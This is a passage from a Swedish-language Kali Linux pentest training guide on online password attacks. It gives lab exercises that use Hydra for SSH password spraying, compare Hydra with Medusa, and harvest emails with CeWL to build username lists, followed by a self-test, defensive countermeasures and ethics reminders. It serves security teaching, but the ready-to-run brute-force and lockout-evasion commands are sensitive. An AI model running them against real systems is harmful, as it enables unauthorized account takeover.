# 1. Skapa användarlista
cat > users.txt << EOF
admin
user
test
backup
support
EOF

# 2. Testa ETT vanligt lösenord mot alla användare
hydra -L users.txt -p "Password123" -t 1 ssh://localhost

# 3. Vänta 30 minuter (eller test i lab utan lockout)
sleep 1800

# 4. Testa nästa lösenord
hydra -L users.txt -p "Welcome1" -t 1 ssh://localhost
```

**🟢 TIP:** I verkliga pentests, testa max 3-5 lösenord per dag för att undvika lockout.

---

### 🔬 Övning 6: Benchmark Hydra vs Medusa

**Scenario:** Jämför prestanda mellan Hydra och Medusa.

```bash
# 1. Skapa identiska testfiler
head -1000 /usr/share/wordlists/rockyou.txt > test_1000.txt

# 2. Benchmark Hydra
time hydra -l testuser -P test_1000.txt ssh://localhost -t 4

# 3. Benchmark Medusa
time medusa -h localhost -u testuser -P test_1000.txt -M ssh -t 4

# 4. Jämför "real" tid i output
```

---

### 🔬 Övning 7: Email Harvesting med CeWL

**Scenario:** Samla emails för användarlista.

```bash
# 1. Extrahera emails från webbplats
cewl -e -d 2 --email_file emails.txt https://example.com

# 2. Rensa och formatera
cat emails.txt | sort -u | grep -E '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$' > clean_emails.txt

# 3. Extrahera endast användarnamn (före @)
cat clean_emails.txt | cut -d@ -f1 > usernames.txt

# 4. Använd i attack
hydra -L usernames.txt -P common_passwords.txt ssh://192.168.1.100
```

---

## ✅ Självtest {#självtest}

### Frågor

1. **Vad är huvudskillnaden mellan online och offline password attacks?**

2. **Varför är online attacker mer riskfyllda ur legal och etisk synpunkt?**

3. **Förklara vad "password spraying" är och varför det används.**

4. **Vilken Hydra-parameter används för att ange en lösenordslista?**

5. **Hur skiljer sig Medusa från Hydra i termer av prestanda?**

6. **Vad gör CeWL och varför är det användbart?**

7. **Vad betyder `^USER^` och `^PASS^` i Hydra http-post-form?**

8. **Nämn tre motåtgärder som förhindrar brute force-attacker.**

9. **Varför bör du använda låg thread-count (-t 1-4) vid RDP/SMB-attacker?**

10. **Hur kan Fail2Ban hjälpa till att skydda SSH-servrar?**

---

### Svar

<details>
<summary>Klicka för att visa svar</summary>

1. **Online:** Attackerar levande tjänster över nätverket, loggas alltid, långsammare (10-1000 försök/sek).
   **Offline:** Arbetar med hash-filer lokalt, ingen loggning, mycket snabbare (miljontals försök/sek).

2. Online attacker:
   - Genererar loggposter med IP och timestamp
   - Kan klassas som DoS vid höga hastigheter
   - Risk för IP-blockering och rapportering till myndigheter
   - Även misslyckade försök är brottsliga

3. **Password spraying** = Testa FÅ lösenord (3-5) mot MÅNGA användare istället för många lösenord mot få användare. Detta undviker account lockout-mekanismer som ofta tillåter 5 försök per användare.

4. `-P <file>` för lösenordslista (stort P), `-p <password>` för enskilt lösenord (litet p).

5. **Medusa** har ofta bättre threading och är snabbare för protokoll som SSH/FTP/SMB, medan **Hydra** har bredare protokoll-stöd och bättre HTTP form-hantering.

6. **CeWL** skapar custom wordlists genom att crawla webbplatser och extrahera ord. Användbart eftersom människor ofta använder företags/produkttermer i lösenord (t.ex. "TechCorp2024").

7. `^USER^` = Platshållare för användarnamn, `^PASS^` = Platshållare för lösenord. Hydra ersätter dessa med värden från användar/lösenordslistor.

8. Tre motåtgärder:
   - **Account lockout** (lås konto efter X försök)
   - **Fail2Ban** (automatisk IP-blockering)
   - **2FA/MFA** (tvåfaktorsautentisering)

   Andra: Rate limiting, CAPTCHA, strong password policy, geo-blocking.

9. RDP och SMB har ofta aggressiva account lockout-policys (t.ex. 3 försök = lockout). Låg thread-count minskar risken för samtidiga försök som triggar lockout.

10. **Fail2Ban** övervakar logfiler (t.ex. /var/log/auth.log) och blockerar automatiskt IP-adresser som visar misstänkta mönster (t.ex. 3+ misslyckade SSH-inloggningar inom 10 minuter).

</details>

---

## 📝 Sammanfattning {#sammanfattning}

### Vad Du Lärt Dig

✅ Skillnaden mellan offline och online password attacks
✅ THC Hydra för brute-force mot 50+ protokoll
✅ Medusa för högpresterande parallella attacker
✅ CeWL för custom wordlist generation från webbplatser
✅ HTTP form-based authentication attacks
✅ Password spraying för att undvika account lockout
✅ Detektering och motåtgärder (IDS, Fail2Ban, 2FA)
✅ Etiska och legala aspekter av online attacker

### Verktygsöversikt

| Verktyg | Primär Användning | Styrka |
|---------|-------------------|--------|
| **Hydra** | Brute-force 50+ protokoll | Mångsidighet, HTTP form-stöd |
| **Medusa** | Snabb parallell brute-force | Prestanda, stabilitet |
| **CeWL** | Custom wordlist generation | Målanpassade ordlistor |
| **Ncrack** | Network auth cracking | Pålitlighet (Nmap-team) |

### Bästa Praxis

🟢 **Använd låga hastigheter** (-t 1-4 threads) för att undvika lockout
🟢 **Password spray** istället för traditionell brute force
🟢 **Generera custom wordlists** med CeWL för bättre träffprocent
🟢 **Kombinera verktyg:** CeWL + John rules + Hydra
🟢 **Dokumentera alla försök** vid penetrationstester
🟢 **Koordinera med klient** angående acceptabla attack-metoder

### 🔴 Etiska Påminnelser

- ❌ Attackera ALDRIG system utan explicit skriftligt tillstånd
- ❌ Online attacker LOGGAS alltid - du kommer spåras
- ❌ Höga attack-hastigheter kan klassas som DoS
- ✅ Testa endast i legala lab-miljöer eller med pentest-kontrakt
- ✅ Använd password spraying för att undvika lockout
- ✅ Informera klient om eventuella account lockouts OMEDELBART

### Nästa Steg

➡️ **[Nivå 4D: Wireless Attacks](niva-4d-wireless-attacks.md)**
   - Aircrack-ng (WPA/WPA2 cracking)
   - Wifite (automated wireless attacks)
   - Reaver (WPS attacks)

---

## 🎓 Redo för Nästa Nivå?

### Checklista innan Du Fortsätter

- [ ] Jag förstår skillnaden mellan online och offline attacks
- [ ] Jag kan använda Hydra för SSH/FTP/HTTP-attacker
- [ ] Jag har testat HTTP form-based authentication med Hydra
- [ ] Jag kan generera custom wordlists med CeWL
- [ ] Jag förstår password spraying-tekniken
- [ ] Jag kan använda Medusa som alternativ till Hydra
- [ ] Jag förstår hur Fail2Ban och IDS fungerar
- [ ] Jag är medveten om de legala riskerna med online attacker
- [ ] Jag har testat kombinationer: CeWL + John + Hydra

**✅ Alla checkboxar markerade?** Du är redo för **Nivå 4D: Wireless Attacks**!

---

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md) | [⬅️ Nivå 4C Del 1: Offline Cracking](niva-4c-password-attacks-pt1.md) | [➡️ Nivå 4D: Wireless Attacks](niva-4d-wireless-attacks.md)

---

**📅 Senast uppdaterad:** 2025-01-18
**✍️ Författare:** Victory Redovisning Kali Linux Guide Project
**📄 Licens:** Endast för utbildningsändamål

---

**🌐 "Online attacks leave footprints - tread carefully, ethically, and legally."**
